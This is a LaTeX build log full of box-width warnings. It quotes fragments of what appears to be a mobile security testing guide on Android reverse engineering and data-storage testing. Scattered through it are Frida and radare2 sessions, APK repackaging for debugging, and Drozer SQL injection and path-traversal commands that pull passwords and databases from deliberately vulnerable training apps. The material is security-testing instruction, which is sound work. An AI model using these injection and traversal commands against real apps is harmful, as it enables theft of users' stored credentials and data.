[]\TU/SourceCodePro(6)/m/n/10.95 strlen \TU/SourceSansPro(0)/m/n/10.95 is calle
d at offset \TU/SourceCodePro(6)/m/n/10.95 0x000018a8\TU/SourceSansPro(0)/m/n/1
0.95 , and the returned value is compared to 0x10 at offset
[262]
Overfull \hbox (18.89967pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x0000176c      str r0, [var_20h] 
                         ; 0x20 ; "$!" ; arg1[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00001770      ldr r3, [var_20h] 
                         ; 0x20 ; "$!" ; entry.preinit0[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017a4      ldr r1, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (121.82964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017bc      add r3, r3, 2     
                         ; "ELF\x01\x01\x01" ; aav.0x00000001[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017c4      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (51.74962pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎╰─> 0x000017d0      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (200.66965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎    0x000017d4      cmp r3, 4         
                         ; aav.0x00000004 ; aav.0x00000001 ; aav.0x00000001[] 
[263]
Overfull \hbox (222.56955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001840      ldr r3, [0x0000186
c]                       ; [0x186c:4]=0x270 section..hash ; section..hash[] 

Overfull \hbox (255.41959pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001844      add r3, pc, r3    
                         ; 0x1abc ; "Product activation passed. Congratulations
!"[] 

Overfull \hbox (259.7996pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001848      mov r0, r3        
                         ; 0x1abc ; "Product activation passed. Congratulations
!" ;[] 

Overfull \hbox (62.69963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x0000184c      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (218.18974pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││                                     
                         ; int puts("Product activation passed. Congratulations
!")[] 

Overfull \hbox (45.17941pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  ││││││   ; CODE XREFS from fcn.00001760 (0x
17ec, 0x1800, 0x1814, 0x1828, 0x183c)[] 

Overfull \hbox (139.34955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │╰╰╰╰╰─> 0x00001854      ldr r3, aav.0x0000
0288                     ; [0x1870:4]=0x288 aav.0x00000288[] 

Overfull \hbox (91.16963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001858      add r3, pc, r3    
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x0000185c      mov r0, r3        
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (53.93965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001860      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (42.98979pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │                                          
                         ; int puts("Incorrect serial.")[] 
[264]
Overfull \hbox (115.25963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 ╰           0x00001868      pop {r4, fp, pc}  
                         ; entry.preinit0 ; entry.preinit0 ;[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/196e63531f9e462f1ab15205845fe2749b783d26.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/444928658f8dea94b4ec067294cc7379daec0908.
png" > [265]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ece45f74f3b110d8097107d86ef4cda57625332a.
png" > [266] [267]
Overfull \hbox (7.94942pt too wide) in paragraph at lines 15369--15369
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING | cle.loader | The main binary is a po
sition-independent executable.[] 
[268] [269]
Overfull \hbox (124.01938pt too wide) in paragraph at lines 15480--15480
[]\TU/SourceCodePro(6)/m/n/10.95 .method public checkServerTrusted([LJava/secur
ity/cert/X509Certificate;Ljava/lang/String;)V[] 

Overfull \hbox (21.08939pt too wide) in paragraph at lines 15480--15480
[]  \TU/SourceCodePro(6)/m/n/10.95 invoke-virtual {v1}, Ljava/util/ArrayList;->
iterator()Ljava/util/Iterator;[] 
[270]
Underfull \hbox (badness 1147) in paragraph at lines 15505--15511
\TU/SourceSansPro(0)/m/n/10.95 ifest file (AndroidManifest.xml). Once you’ve un
packed the app (e.g. \TU/SourceCodePro(6)/m/n/10.95 apktool d --no-src

Overfull \hbox (21.11864pt too wide) in paragraph at lines 15505--15511
\TU/SourceCodePro(6)/m/n/10.95 UnCrackable-Level1.apk\TU/SourceSansPro(0)/m/n/1
0.95 ) and decoded the Android Manifest, add \TU/SourceCodePro(6)/m/n/10.95 and
roid:debuggable="true"

Overfull \hbox (116.43965pt too wide) in paragraph at lines 15533--15536
[]\TU/SourceSansPro(0)/m/n/10.95 Note that the Android Studio build tools direc
tory must be in the path. It is located at \TU/SourceCodePro(6)/m/n/10.95 [SDK-
Path]/build-tools/[version]\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (20.45732pt too wide) in paragraph at lines 15540--15545
\TU/SourceSansPro(0)/m/n/10.95 fore, the IDE has already created a debug keysto
re and certificate in \TU/SourceCodePro(6)/m/n/10.95 $HOME/.android/debug.keyst
ore\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (244.4694pt too wide) in paragraph at lines 15552--15552
[]\TU/SourceCodePro(6)/m/n/10.95 $ keytool -genkey -v -keystore ~/.android/debu
g.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000[] 
[271]
Overfull \hbox (156.86937pt too wide) in paragraph at lines 15560--15560
[]\TU/SourceCodePro(6)/m/n/10.95 $ apksigner sign --ks  ~/.android/debug.keysto
re --ks-key-alias signkey UnCrackable-Repackaged.apk[] 

Overfull \hbox (134.96939pt too wide) in paragraph at lines 15569--15569
[]\TU/SourceCodePro(6)/m/n/10.95 $ jarsigner -verbose -keystore ~/.android/debu
g.keystore ../UnCrackable-Repackaged.apk signkey[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d4138675f1560de187de0888b5d85fc997c30b87.
png" > [272]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5dca12a550e25ea0d8869ad28a3f1018e7b054bd.
png" > [273]
Overfull \hbox (10.73807pt too wide) in paragraph at lines 15646--15649
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it in the origi
nal \TU/SourceCodePro(6)/m/n/10.95 assets/index.android.bundle
[274]
Overfull \hbox (27.52444pt too wide) in paragraph at lines 15705--15708
[]\TU/SourceSansPro(0)/m/n/10.95 An Android application’s decompiled smali code
 can be patched to introduce a call to \TU/SourceCodePro(6)/m/n/10.95 System.lo
adLibrary\TU/SourceSansPro(0)/m/n/10.95 .
[275] [276] [277]
Overfull \hbox (29.84938pt too wide) in paragraph at lines 15921--15921
[]\TU/SourceCodePro(6)/m/n/10.95 [Huawei Nexus 6P::sg.vantagepoint.helloworldjn
i]-> Process.enumerateModules()[] 
[278] [279] [280]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65d9911c121984364aa4dd59d11f9e12cbaba7b1.
png" > [281] [282] [283]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 16161--16161
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 
[284] [285]
Overfull \hbox (97.73936pt too wide) in paragraph at lines 16242--16242
[]\TU/SourceCodePro(6)/m/n/10.95 [USB::Android Emulator 5554::sg.vantagepoint.u
ncrackable1]-> [*] MainActivity.a modified[] 
[286] [287]
Overfull \hbox (12.32942pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory list modules[] 

Overfull \hbox (522.59837pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------------------------------
-  ------------  --------------------  ----------------------------------------
----------------------------[] 

Overfull \hbox (152.48962pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 app_process64                                 
   0x558b1fd000  32768 (32.0 KiB)      /system/bin/app_process64[] 
[288]
Overfull \hbox (237.89957pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libandroid_runtime.so                         
   0x7dbc859000  1982464 (1.9 MiB)     /system/lib64/libandroid_runtime.so[] 

Overfull \hbox (161.2496pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libbinder.so                                  
   0x7dbf5d7000  557056 (544.0 KiB)    /system/lib64/libbinder.so[] 

Overfull \hbox (156.86963pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libcutils.so                                  
   0x7dbff4d000  77824 (76.0 KiB)      /system/lib64/libcutils.so[] 

Overfull \hbox (178.76959pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libhwbinder.so                                
   0x7dbfd13000  163840 (160.0 KiB)    /system/lib64/libhwbinder.so[] 

Overfull \hbox (384.62955pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 base.odex                                     
   0x7d10dd0000  442368 (432.0 KiB)    /data/app/sg.vantagepoint.helloworldjni-
1/oat/arm64/base.odex[] 

Overfull \hbox (441.56952pt too wide) in paragraph at lines 16389--16389
[]\TU/SourceCodePro(6)/m/n/10.95 libnative-lib.so                              
   0x7d1c499000  73728 (72.0 KiB)      /data/app/sg.vantagepoint.helloworldjni-
1/lib/arm64/libnative-lib.so[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 16416--16420
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[289] [290] [291]
Overfull \hbox (200.66937pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.helloworldjni on (google: 8.1.
0) [usb] # memory dump all /Users/foo/memory_Android/memory[] 

Overfull \hbox (408.71915pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 1002.8 MiB from base: 0x14140000  [---
---------------------------------]    0%  00:11:03(session detach message) proc
ess-terminated[] 

Overfull \hbox (69.26944pt too wide) in paragraph at lines 16559--16559
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 8.0 MiB from base: 0x7fc753e000  [####
################################]  100%[] 
[292]
Overfull \hbox (125.82916pt too wide) in paragraph at lines 16642--16646
[]\TU/SourceSansPro(0)/m/n/10.95 We’ll keep using the HelloWorld JNI app, open 
a session with r2frida \TU/SourceCodePro(6)/m/n/10.95 r2 frida://usb//sg.vantag
epoint.helloworldjni
[293]
Overfull \hbox (88.97942pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 extCacheDir         /storage/emulated/0/Androi
d/data/sg.vantagepoint.helloworldjni/cache[] 

Overfull \hbox (32.03943pt too wide) in paragraph at lines 16674--16674
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir              /storage/emulated/0/Androi
d/obb/sg.vantagepoint.helloworldjni[] 
[294]
Overfull \hbox (117.44937pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 [0x00000000]> \ic sg.vantagepoint.helloworldjn
i.MainActivity~sg.vantagepoint.helloworldjni[] 

Overfull \hbox (108.68938pt too wide) in paragraph at lines 16732--16732
[]\TU/SourceCodePro(6)/m/n/10.95 public native java.lang.String sg.vantagepoint
.helloworldjni.MainActivity.stringFromJNI()[] 

Overfull \hbox (67.07942pt too wide) in paragraph at lines 16788--16788
[]            \TU/SourceCodePro(6)/m/n/10.95 ;-- sym.fun.Java_sg_vantagepoint_h
elloworldjni_MainActivity_stringFromJNI:[] 
[295]
Overfull \hbox (53.93956pt too wide) in paragraph at lines 16788--16788
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x7d1c499558      029d42f9       l
dr x2, [x8, 0x538]       ; [0x538:4]=-1 ; 1336[] 
[296] [297]
Overfull \hbox (279.50932pt too wide) in paragraph at lines 16882--16882
[]\TU/SourceCodePro(6)/m/n/10.95 cmdline = console=ttyHSL0,115200,n8 androidboo
t.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1[] 
[298] [299]
Overfull \hbox (277.3193pt too wide) in paragraph at lines 16994--16994
[]\TU/SourceCodePro(6)/m/n/10.95 $ build/tools/make-standalone-toolchain.sh --a
rch=arm --platform=android-24 --install-dir=/tmp/my-android-toolchain[] 

Overfull \hbox (23.27953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 DDR -> /dev/block/mmcblk0p24[] 

Overfull \hbox (29.84952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 aboot -> /dev/block/mmcblk0p6[] 

Overfull \hbox (42.98952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 abootb -> /dev/block/mmcblk0p11[] 

Overfull \hbox (29.84953pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 boot -> /dev/block/mmcblk0p19[] 

Overfull \hbox (56.12952pt too wide) in paragraph at lines 17019--17019
[]\TU/SourceCodePro(6)/m/n/10.95 lrwxrwxrwx root     root              1970-08-
30 22:31 userdata -> /dev/block/mmcblk0p28[] 

Overfull \hbox (7.9494pt too wide) in paragraph at lines 17026--17026
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell "su -c dd if=/dev/block/mmcblk0p19
 of=/data/local/tmp/boot.img"[] 
[300]
Overfull \hbox (1015.3492pt too wide) in paragraph at lines 17057--17057
[]\TU/SourceCodePro(6)/m/n/10.95 $ fastboot boot zImage-dtb initrd.img --base 0
 --kernel-offset 0x8000 --ramdisk-offset 0x2900000 --tags-offset 0x2700000 -c "
console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 maxcpus
=2 msm_watchdog_v2.enable=1"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/79cc611a9662b42c800f698e259e4a68828ed1c9.
jpg" > [301]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2b3a00354d9a95a605f5ab9905e3b4d4e39d9c5a.
jpg" > [302]
Overfull \hbox (26.24696pt too wide) in paragraph at lines 17122--17125
[]\TU/SourceSansPro(0)/m/n/10.95 You can find the function prototypes for all s
ystem calls in the kernel header file arch/arm/include/asm/unistd.h.
[303] [304]
Overfull \hbox (290.45944pt too wide) in paragraph at lines 17183--17183
[]        \TU/SourceCodePro(6)/m/n/10.95 make ARCH=arm CROSS_COMPILE=$(TOOLCHAI
N)/bin/arm-eabi- -C $(KERNEL) M=$(shell pwd) CFLAGS_MODULE=-fno-pic modules[] 
[305] [306]
Overfull \hbox (128.3994pt too wide) in paragraph at lines 17275--17275
[]\TU/SourceCodePro(6)/m/n/10.95 $ /tmp/my-android-toolchain/bin/arm-linux-andr
oideabi-gcc -pie -fpie -o kmem_util kmem_util.c[] 
[307]
Underfull \hbox (badness 2205) in paragraph at lines 17339--17342
[]\TU/SourceSansPro(0)/m/n/10.95 Attacking Android Applications with Debuggers 
(19 January 2015) - [][]$[][][][][] [] [] [] [][][][] [] [][][][][][] [] [][][]
 []

Underfull \hbox (badness 4886) in paragraph at lines 17345--17348
[]\TU/SourceSansPro(0)/m/n/10.95 Update on Development of Xposed for Nougat - [
][]$[][][][][] [] [] [] [][][] [] [][][] [][] [][][][][][][][][][] [] [][][] []
 [][][][][][] [][]
[308] [309]
Overfull \hbox (100.98427pt too wide) in paragraph at lines 17509--17511
[]\TU/SourceSansPro(0)/m/n/10.95 The username and password are stored in clear 
text in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_prefs/k
ey.xml\TU/SourceSansPro(0)/m/n/10.95 . 
[310]
Overfull \hbox (10.13937pt too wide) in paragraph at lines 17533--17533
[]\TU/SourceCodePro(6)/m/n/10.95 root@hermes:/data/data/sg.vp.owasp_mobile.myfi
rstapp/shared_prefs # ls -la[] 

Overfull \hbox (79.92378pt too wide) in paragraph at lines 17563--17567
\TU/SourceSansPro(0)/m/n/10.95 vided data and stored in the clear text file \TU
/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/databases/privateNotSoSec
ure\TU/SourceSansPro(0)/m/n/10.95 . 
[311] [312]
Underfull \hbox (badness 6063) in paragraph at lines 17709--17713
\TU/SourceSansPro(0)/m/n/10.95 this access with \TU/SourceCodePro(6)/m/n/10.95 
MODE_PRIVATE\TU/SourceSansPro(0)/m/n/10.95 . Modes such as \TU/SourceCodePro(6)
/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/10.95 (deprecated) and
[313]
Overfull \hbox (10.26721pt too wide) in paragraph at lines 17756--17764
[]\TU/SourceSansPro(0)/m/n/10.95 It’s also worth knowing that files stored outs
ide the application folder (\TU/SourceCodePro(6)/m/n/10.95 data/data/<package-n
ame>/\TU/SourceSansPro(0)/m/n/10.95 )

Underfull \hbox (badness 3291) in paragraph at lines 17779--17783
[]\TU/SourceSansPro(0)/m/n/10.95 Check \TU/SourceCodePro(6)/m/n/10.95 AndroidMa
nifest.xml \TU/SourceSansPro(0)/m/n/10.95 for read/write external storage permi
ssions, for example,

Overfull \hbox (29.5756pt too wide) in paragraph at lines 17779--17783
\TU/SourceCodePro(6)/m/n/10.95 uses-permission android:name="android.permission
.WRITE_EXTERNAL_STORAGE"\TU/SourceSansPro(0)/m/n/10.95 . 

Underfull \hbox (badness 5008) in paragraph at lines 17794--17802
[]\TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_READABLE \TU/SourceSansPro(0)/m/n/1
0.95 or \TU/SourceCodePro(6)/m/n/10.95 MODE_WORLD_WRITABLE\TU/SourceSansPro(0)/
m/n/10.95 : You should avoid using
[314] [315]
Overfull \hbox (15.61441pt too wide) in paragraph at lines 17920--17920
 []    \TU/SourceCodePro(6)/m/n/10.95 buildConfigField "String", "hiddenPasswor
d", "\"${hiddenPassword}\""[] 
[316]
Underfull \hbox (badness 1127) in paragraph at lines 17979--17991
\TU/SourceSansPro(0)/m/n/10.95 droid 9 (API level 28) introduces the \TU/Source
CodePro(6)/m/n/10.95 unlockedDeviceRequied \TU/SourceSansPro(0)/m/n/10.95 flag.
 By passing \TU/SourceCodePro(6)/m/n/10.95 true \TU/SourceSansPro(0)/m/n/10.95 
to the
[317]
Overfull \hbox (82.96791pt too wide) in paragraph at lines 18063--18068
\TU/SourceSansPro(0)/m/n/10.95 the server and should then retrieve the attestat
ion certificate chain using the \TU/SourceCodePro(6)/m/n/10.95 KeyStore.getCert
ificateChain
[318]
Overfull \hbox (159.5245pt too wide) in paragraph at lines 18135--18135
[]\TU/SourceCodePro(6)/m/n/10 "308202ca30820270a003020102020101300a06082a8648ce
3d040302308188310b30090603550406130..."[][],[]|  

Overfull \hbox (159.5245pt too wide) in paragraph at lines 18136--18136
[]\TU/SourceCodePro(6)/m/n/10 "308202783082021ea00302010202021001300a06082a8648
ce3d040302308198310b300906035504061..."[][],[]|  

Overfull \hbox (153.5245pt too wide) in paragraph at lines 18137--18137
[]\TU/SourceCodePro(6)/m/n/10 "3082028b30820232a003020102020900a2059ed10e435b57
300a06082a8648ce3d040302308198310b3..."[]|  
[319] [320]
Underfull \hbox (badness 1596) in paragraph at lines 18277--18284
[]\TU/SourceSansPro(0)/m/n/10.95 Make sure that the app is using the Android Ke
yStore and Cipher mechanisms to securely

Underfull \hbox (badness 4846) in paragraph at lines 18277--18284
\TU/SourceSansPro(0)/m/n/10.95 store encrypted information on the device. Look 
for the patterns \TU/SourceCodePro(6)/m/n/10.95 AndroidKeystore\TU/SourceSansPr
o(0)/m/n/10.95 ,

Underfull \hbox (badness 3861) in paragraph at lines 18277--18284
\TU/SourceCodePro(6)/m/n/10.95 import java.security.KeyStore\TU/SourceSansPro(0
)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import javax.crypto.Cipher\TU/Sour
ceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 import
[321] [322] [323]
Overfull \hbox (61.24603pt too wide) in paragraph at lines 18463--18473
[]\TU/SourceSansPro(0)/m/n/10.95 Check Shared Preferences that are stored as XM
L files (in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/shared_pre
fs\TU/SourceSansPro(0)/m/n/10.95 )

Overfull \hbox (0.60928pt too wide) in paragraph at lines 18480--18487
[]\TU/SourceSansPro(0)/m/n/10.95 Determine whether a Realm database is availabl
e in \TU/SourceCodePro(6)/m/n/10.95 /data/data/<package-name>/files/\TU/SourceS
ansPro(0)/m/n/10.95 ,
[324] [325]
Underfull \hbox (badness 1946) in paragraph at lines 18569--18571
[]\TU/SourceSansPro(0)/m/n/10.95 You should check the apps’ source code for log
ging mechanisms by searching for the following

Underfull \hbox (badness 1231) in paragraph at lines 18611--18619
\TU/SourceSansPro(0)/m/n/10.95 check the ProGuard configuration file (proguard-
rules.pro) for the following options (according to
[326]
Underfull \hbox (badness 2846) in paragraph at lines 18656--18661
[]\TU/SourceSansPro(0)/m/n/10.95 ProGuard guarantees removal of the \TU/SourceC
odePro(6)/m/n/10.95 Log.v \TU/SourceSansPro(0)/m/n/10.95 method call. Whether t
he rest of the code (\TU/SourceCodePro(6)/m/n/10.95 new

Underfull \hbox (badness 1005) in paragraph at lines 18688--18697
[]\TU/SourceSansPro(0)/m/n/10.95 Many application developers still use \TU/Sour
ceCodePro(6)/m/n/10.95 System.out.println \TU/SourceSansPro(0)/m/n/10.95 or \TU
/SourceCodePro(6)/m/n/10.95 printStackTrace \TU/SourceSansPro(0)/m/n/10.95 inst
ead of

Underfull \hbox (badness 1199) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 a proper logging class. Therefore, your testing 
strategy must include all output generated while

Underfull \hbox (badness 2150) in paragraph at lines 18688--18697
\TU/SourceSansPro(0)/m/n/10.95 the application is starting, running and closing
. To determine what data is directly printed by
[327]
Overfull \hbox (12.3294pt too wide) in paragraph at lines 18703--18703
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 

Underfull \hbox (badness 1052) in paragraph at lines 18710--18715
[]\TU/SourceSansPro(0)/m/n/10.95 You may also want to apply further filters or 
regular expressions (using \TU/SourceCodePro(6)/m/n/10.95 logcat\TU/SourceSansP
ro(0)/m/n/10.95 ’s regex flags \TU/SourceCodePro(6)/m/n/10.95 -e
[328] [329]
Overfull \hbox (21.40335pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 use \TU/SourceCodePro(6)/m/n/10.95 android:permi
ssion\TU/SourceSansPro(0)/m/n/10.95 , other applications must declare correspon
ding \TU/SourceCodePro(6)/m/n/10.95 <uses-permission>

Overfull \hbox (100.0037pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 elements in their manifests to interact with you
r content provider. You can use the \TU/SourceCodePro(6)/m/n/10.95 android:gran
tUriPermissions

Overfull \hbox (65.1985pt too wide) in paragraph at lines 18856--18869
\TU/SourceSansPro(0)/m/n/10.95 attribute to grant more specific access to other
 apps; you can limit access with the \TU/SourceCodePro(6)/m/n/10.95 <grant-uri-
permission>
[330]
Underfull \hbox (badness 1540) in paragraph at lines 18904--18907
[]\TU/SourceSansPro(0)/m/n/10.95 We will use the vulnerable password manager ap
p [][]Sieve[][] as an example of a vulnerable content
[331] [332]
Overfull \hbox (1.56197pt too wide) in paragraph at lines 19011--19014
[]\TU/SourceSansPro(0)/m/n/10.95 To identify content provider URIs within the a
pplication, use Drozer’s \TU/SourceCodePro(6)/m/n/10.95 scanner.provider.findur
is

Overfull \hbox (165.62936pt too wide) in paragraph at lines 19037--19037
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --vertical[] 
[333]
Underfull \hbox (badness 2573) in paragraph at lines 19075--19080
\TU/SourceSansPro(0)/m/n/10.95 are based on SQL, they may be vulnerable to SQL 
injection. You can use the Drozer module

Underfull \hbox (badness 2582) in paragraph at lines 19075--19080
\TU/SourceCodePro(6)/m/n/10.95 app.provider.query \TU/SourceSansPro(0)/m/n/10.9
5 to test for SQL injection by manipulating the projection and selection

Overfull \hbox (202.85933pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "[]"[] 

Overfull \hbox (99.92941pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[] FROM Passwords" (code 
1): , while compiling: SELECT [] FROM Passwords[] 

Overfull \hbox (196.28934pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --selection "[]"[] 

Overfull \hbox (73.6494pt too wide) in paragraph at lines 19087--19087
[]\TU/SourceCodePro(6)/m/n/10.95 unrecognized token: "[])" (code 1): , while co
mpiling: SELECT * FROM Passwords WHERE ([])[] 

Overfull \hbox (196.28935pt too wide) in paragraph at lines 19102--19102
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "*[] 
[334]
Overfull \hbox (277.31935pt too wide) in paragraph at lines 19111--19111
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.query content://com.mwr.e
xample.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"[] 

Overfull \hbox (566.39923pt too wide) in paragraph at lines 19145--19145
[]\TU/SourceCodePro(6)/m/n/10.95 dz> run app.provider.download content://com.vu
lnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/
database.db /home/user/database.db[] 

Underfull \hbox (badness 1789) in paragraph at lines 19147--19150
[]\TU/SourceSansPro(0)/m/n/10.95 Use the \TU/SourceCodePro(6)/m/n/10.95 scanner
.provider.traversal \TU/SourceSansPro(0)/m/n/10.95 module to automate the proce
ss of finding content
[335]
Overfull \hbox (194.09937pt too wide) in paragraph at lines 19166--19166
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb shell content query --uri content://com.
owaspomtg.vulnapp.provider.CredentialProvider/credentials[] 
[336] [337] [338]
Overfull \hbox (327.68936pt too wide) in paragraph at lines 19407--19407
[]\TU/SourceCodePro(6)/m/n/10.95 $ dd if=backup.ab bs=1 skip=24 | python -c "im
port zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar
[] 

Overfull \hbox (7.94939pt too wide) in paragraph at lines 19430--19430
[]\TU/SourceCodePro(6)/m/n/10.95 $ abe [-debug] [-useenv=yourenv] unpack <backu
p.ab> <backup.tar> [password][] 
[339]
Overfull \hbox (69.62175pt too wide) in paragraph at lines 19511--19514
[]\TU/SourceSansPro(0)/m/n/10.95 [Images/Chapters/0x05d/2.png](Images/Chapters/
0x05d/1.png” 

Overfull \hbox (136.94234pt too wide) in paragraph at lines 19511--19514
\TU/SourceSansPro(0)/m/n/10.95 width=“500px](Images/Chapters/0x05d/2.png](Image
s/Chapters/0x05d/1.png” 
[340]
Overfull \hbox (176.03922pt too wide) in paragraph at lines 19518--19527
[]\TU/SourceSansPro(0)/m/n/10.95 On devices supporting [][]file-based encryptio
n (FBE)[][], snapshots are stored in the \TU/SourceCodePro(6)/m/n/10.95 /data/s
ystem_ce/<USER_ID>/<IMAGE_FOLDER_NAME>

Overfull \hbox (17.3786pt too wide) in paragraph at lines 19518--19527
\TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCodePro(6)/m/n/10.95 recent_images
\TU/SourceSansPro(0)/m/n/10.95 . If the device doesn’t support FBE, the \TU/Sou
